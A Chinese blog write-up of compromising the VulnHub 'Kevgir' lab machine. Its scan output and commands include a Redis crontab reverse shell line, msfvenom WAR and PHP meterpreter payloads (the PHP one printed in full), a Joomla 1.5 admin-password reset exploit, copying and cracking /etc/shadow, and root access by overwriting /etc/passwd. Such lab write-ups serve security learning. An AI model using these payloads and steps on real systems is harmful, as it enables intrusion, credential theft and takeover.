---
title: 靶机日记 一 | Kevgir

categories:
  - Technical
tags:
  - Digilal Design
  - EEEE
date: 2020-08-18 18:50:10
---

靶机地址：https://www.vulnhub.com/entry/kevgir-1,137/

盯上这个靶机是因为最近在看一些未授权访问漏洞总结，主要是针对 Redis、Jenkins 等 Web 服务的未授权访问，于是盯上了这个靶机。

<!-- more -->

### 一、发现主机

靶机上没有 net-tools 工具，所以不能直接获取静态 ip（但面对目标，我们本来就对其的 ip 未知。

首先，把虚拟机的网络选择桥接模式，这样我们的靶机就和自己在一个网段了，这里我要吐槽一下，我原先用的校园网..子网掩码是 16 位的，扫描出学校几百个主机来，真是头大。。~~为了方便我特地把自己的电脑换成了手机热点，缩短目标范围。~~正确的解决方案是使用 host-only 模式，给 Virtualbox 添加一块虚拟网卡。

第一步在命令行使用`ifconfig`查看自己的 wifi 的 ip，接着`nmap -T5 -sP xxx.xxx.xxx.0/24`就可以扫描了。

```bash
promote at ~ ❯ nmap -T5 -sP  192.168.56.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 21:13 CST
Nmap scan report for promote.cache-dns.local (192.168.56.1)
Host is up (0.00064s latency).
Nmap scan report for promote.cache-dns.local (192.168.56.100)
Host is up (0.00082s latency).
Nmap scan report for promote.cache-dns.local (192.168.56.101)
Host is up (0.0025s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.83 seconds
```

第一个是网关、第二个是本机 ip、第三个就是靶机 Kevgir 了（如何判定？在浏览器输入`http://172.20.10.8`可以打开运行在其 80 端口的 web 服务。

然后，详细扫描一下靶机，果然开了几万个端口、http 服务有四个、80、8080、8081、9000。还有默认开在 6379 端口的 redis

```zsh
Princeling-Mac at ~ ❯ nmap -sV -p- 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 19:49 CST
Nmap scan report for 192.168.56.101
Host is up (0.00064s latency).
Not shown: 65517 closed ports
PORT      STATE SERVICE     VERSION
25/tcp    open  ftp         vsftpd 3.0.2
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
6379/tcp  open  redis       Redis key-value store 3.0.7
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
9000/tcp  open  http        Jetty winstone-2.9
43226/tcp open  nlockmgr    1-4 (RPC #100021)
45949/tcp open  mountd      1-3 (RPC #100005)
46078/tcp open  mountd      1-3 (RPC #100005)
47590/tcp open  status      1 (RPC #100024)
57645/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
59100/tcp open  mountd      1-3 (RPC #100005)
59651/tcp open  unknown
```

![80](http://leiblog.wang/static/image/2020/8/d0YHyw.png)

#### 二、Redis 未授权漏洞攻击(失败了:|

Nmap 扫描后发现主机的 6379 端口对外开放，就可以用本地 Redis 远程连接服务器（redis 在开放往外网的情况下，默认配置下是空口令，端口为 6379）连接后可以获取 Redis 敏感数据。首先扫描一下 redis 服务的详细信息、nmap 有个自动扫描脚本。

```zsh
promote at ~ ❯ nmap -A -p 6379 --script=redis-info 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 21:55 CST
Nmap scan report for promote.cache-dns.local (192.168.56.101)
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 3.0.7 (32 bits)
| redis-info:
|   Version: 3.0.7
|   Operating System: Linux 3.19.0-25-generic i686
|   Architecture: 32 bits
|   Process ID: 1185
|   Used CPU (sys): 2.13
|   Used CPU (user): 0.70
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 622.68K
|   Role: master
|   Bind addresses:
|     0.0.0.0
|   Client connections:
|_    192.168.56.1
```

利用这个漏洞之前，先在本地侦听一个端口。

```zsh
promote at ~ ❯ ncat -lvnp 7999
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::7999
Ncat: Listening on 0.0.0.0:7999
```

注意到本机的 ip 是：`10.32.187.196`。

连接到 redis-cli，准备利用 crontab 反弹 shell

```zsh
promote at ~ ❯ redis-cli -h 192.168.56.101
192.168.56.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/10.32.187.196/7999 0>&1\n"
OK
192.168.56.101:6379> config set dir /var/spool/cron/
OK
192.168.56.101:6379> config set dbfilename root
OK
192.168.56.101:6379> save
OK
192.168.56.101:6379> keys *
1) "x"
192.168.56.101:6379> get x
"\n* * * * * bash -i >& /dev/tcp/10.32.187.196/7999 0>&1\n"
```

大概等一分钟才会弹回来？

。。。好像没用，再尝试用 ssh 私钥登陆的方法，保存失败，看来是没有 root 权限。

### 三、从 8080 端口攻击

8080 端口启动的是 tomcat 的服务，用 nikto 扫描一下

```zsh
promote at ~ ❯ nikto -h 192.168.56.101 -p 8080 -o kevgir.8080.html
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        8080
+ Start Time:         2020-08-20 13:03:40 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-08-20 13:03:48 (GMT8) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

在报告里发现有默认口令的登陆页面：

| URI           | /manager/html                                                                                                      |
| ------------- | ------------------------------------------------------------------------------------------------------------------ |
| HTTP Method   | GET                                                                                                                |
| Description   | Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat. |
| Test Links    | http://192.168.56.101:8080/manager/html http://192.168.56.101:8080/manager/html                                    |
| OSVDB Entries | [OSVDB-0](http://osvdb.org/0)                                                                                      |

登陆进去，可以部署 war 文件、使用 msf 生成、如何生成可以看我的[Generate payload with MSF](http://leiblog.wang/Generate-payload-with-MSF/)这篇文章。

```zsh
promote at ~ ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war > shell.war

Payload size: 1097 bytes
Final size of war file: 1097 bytes
```

### 四、从 8081 端口攻击

![](http://leiblog.wang/static/image/2020/8/OAxKRs.png)

Joomla webpage、所以我们使用 joomscan 来扫描

```zsh
promote at ~/joomscan ±(master) ❯ perl joomscan.pl -u http://192.168.56.101:8081/

    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.56.101:8081/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 1.5

[+] Core Joomla Vulnerability
[++] Joomla! 1.5 Beta 2 - 'Search' Remote Code Execution
EDB : https://www.exploit-db.com/exploits/4212/

Joomla! 1.5 Beta1/Beta2/RC1 - SQL Injection
CVE : CVE-2007-4781
EDB : https://www.exploit-db.com/exploits/4350/

Joomla! 1.5.x - (Token) Remote Admin Change Password
CVE : CVE-2008-3681
EDB : https://www.exploit-db.com/exploits/6234/

Joomla! 1.5.x - Cross-Site Scripting / Information Disclosure
CVE: CVE-2011-4909
EDB : https://www.exploit-db.com/exploits/33061/

Joomla! 1.5.x - 404 Error Page Cross-Site Scripting
EDB : https://www.exploit-db.com/exploits/33378/

Joomla! 1.5.12 - read/exec Remote files
EDB : https://www.exploit-db.com/exploits/11263/

Joomla! 1.5.12 - connect back Exploit
EDB : https://www.exploit-db.com/exploits/11262/

Joomla! Plugin 'tinybrowser' 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)
CVE : CVE-2011-4908
EDB : https://www.exploit-db.com/exploits/9926/

Joomla! 1.5 - URL Redirecting
EDB : https://www.exploit-db.com/exploits/14722/

Joomla! 1.5.x - SQL Error Information Disclosure
EDB : https://www.exploit-db.com/exploits/34955/

Joomla! - Spam Mail Relay
EDB : https://www.exploit-db.com/exploits/15979/

Joomla! 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass
EDB : https://www.exploit-db.com/exploits/16091/

Joomla! < 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities
EDB : https://www.exploit-db.com/exploits/36176/

Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution
CVE : CVE-2015-8562
EDB : https://www.exploit-db.com/exploits/38977/

Joomla! 1.0 < 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution
CVE : CVE-2015-8562 , CVE-2015-8566
EDB : https://www.exploit-db.com/exploits/39033/

Joomla! 1.5.0 Beta - 'pcltar.php' Remote File Inclusion
CVE : CVE-2007-2199
EDB : https://www.exploit-db.com/exploits/3781/

Joomla! Component xstandard editor 1.5.8 - Local Directory Traversal
CVE : CVE-2009-0113
EDB : https://www.exploit-db.com/exploits/7691/



[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.56.101:8081/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.56.101:8081/robots.txt

Interesting path found from robots.txt
http://192.168.56.101:8081/administrator/
http://192.168.56.101:8081/cache/
http://192.168.56.101:8081/components/
http://192.168.56.101:8081/images/
http://192.168.56.101:8081/includes/
http://192.168.56.101:8081/installation/
http://192.168.56.101:8081/language/
http://192.168.56.101:8081/libraries/
http://192.168.56.101:8081/media/
http://192.168.56.101:8081/modules/
http://192.168.56.101:8081/plugins/
http://192.168.56.101:8081/templates/
http://192.168.56.101:8081/tmp/
http://192.168.56.101:8081/xmlrpc/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found
 config file path : http://192.168.56.101:8081/configuration.php-dist
```

刷出很多 CVE，咱们随便选一个用；

https://www.exploit-db.com/exploits/6234/

教程也有。

```txt
Example :


1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm

2. Write into field "token" char ' and Click OK.

3. Write new password for admin

4. Go to url : target.com/administrator/

5. Login admin with new password

# milw0rm.com [2008-08-12]

```

先进入http://192.168.56.101:8081/index.php?option=com_user&view=reset&layout=confirm

跟着 2、3 部走了之后，再去http://192.168.56.101:8081//administrator/

用户名 admin、密码就可以进入后台了、接着在后台反弹 shell

![](http://leiblog.wang/static/image/2020/8/OYdx4c.png)

在这里，然后可以更改页面的 php 文件，替换成 php 反弹 shell 的脚本。

```bash
promote at ~ ❯ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1113 bytes
/*<?php /**/ error_reporting(0); $ip = '192.168.56.1'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

在 msf 里配置：

```zsh
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.56.1
lhost => 192.168.56.1
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Sending stage (38288 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:34605) at 2020-08-19 13:14:34 +0800
```

然后访问http://192.168.56.101:8081/templates/beez/index.php就会打开meterpreter了。

```zsh
meterpreter > sysinfo
Computer    : canyoupwnme
OS          : Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686
Meterpreter : php/linux
meterpreter > shell
Process 2169 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@canyoupwnme:/var/www/html/joomla/templates/beez$ cd /bin
cd /bin
www-data@canyoupwnme:/bin$ ls -al
ls -al
total 9428
drwxr-xr-x  2 root root    4096 Feb  3  2016 .
drwxr-xr-x 22 root root    4096 Feb 13  2016 ..
-rwxr-xr-x  1 root root  986672 Oct  7  2014 bash
```

`find / -perm -u=s 2>/dev/null`来搜索能够使用的 sudo 命令。

在 bin 下面使用 cp 命令，拷贝 shadow 文件

```zsh
www-data@canyoupwnme:/bin$ cp /etc/shadow /tmp
cp /etc/shadow /tmp
www-data@canyoupwnme:/bin$ cd /tmp
cd /tmp
www-data@canyoupwnme:/tmp$ cat shadow
cat shadow
root:$6$6ZcgUVCV$Ocsce9FUHYswcbI3UtrPNqFnkvcPOnEtstWlVSTqGYEYAYZ9aYw7tnW35uRGxb1z7ZZBZ.hoQcm/S/cg0f4uI0:16843:0:99999:7:::
daemon:*:16652:0:99999:7:::
bin:*:16652:0:99999:7:::
sys:*:16652:0:99999:7:::
```

然后复制 shadow 文件到本机，用 john 来破解

```zsh
➜  ~ john shadow
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (admin)
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
resu             (user)
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
2g 0:00:00:17 33.62% 2/3 (ETA: 13:37:38) 0.1174g/s 3439p/s 3439c/s 3439C/s blazer0..copper0
Proceeding with incremental:ASCII
```

好吧、虽然知道了 admin 和 resu 的密码，但毕竟还是不知道 root 的

但可以用 admin 当跳板,用同样的方法，修改 passwd 文件，将 admin 的 uid 和 gid 都替换为 0、然后在本地搭建一个 http 服务，把 passwd 文件传送给靶机。

Nodejs 简易的 http 服务：

```zsh
promote at ~ ❯ http-server .
Starting up http-server, serving .
Available on:
  http://127.0.0.1:8080
  http://10.32.187.196:8080
  http://192.168.56.1:8080
  http://10.211.55.2:8080
  http://192.168.57.2:8080
Hit CTRL-C to stop the server
[2020-08-19T05:50:16.269Z]  "GET /" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
(node:84873) [DEP0066] DeprecationWarning: OutgoingMessage.prototype._headers is deprecated
[2020-08-19T05:50:16.602Z]  "GET /favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
[2020-08-19T05:50:16.603Z]  "GET /favicon.ico" Error (404): "Not found"
[2020-08-19T05:50:37.045Z]  "GET /passwd" "Wget/1.15 (linux-gnu)"
[2020-08-19T05:51:02.060Z]  "GET /passwd" "Wget/1.15 (linux-gnu)"
```

拿下 root 权限：

```zsh
www-data@canyoupwnme:/bin$ cd /tmp
cd /tmp
www-data@canyoupwnme:/tmp$ wget http://192.168.56.1:8080/passwd
wget http://192.168.56.1:8080/passwd
--2020-08-19 08:51:00--  http://192.168.56.1:8080/passwd
Connecting to 192.168.56.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1439 (1.4K) [application/octet-stream]
Saving to: 'passwd'

100%[======================================>] 1,439       --.-K/s   in 0s

2020-08-19 08:51:00 (64.0 MB/s) - 'passwd' saved [1439/1439]

www-data@canyoupwnme:/tmp$ cp passwd /etc/passwd
cp passwd /etc/passwd
www-data@canyoupwnme:/tmp$ su admin
su admin
Password: admin

root@canyoupwnme:/tmp#
```
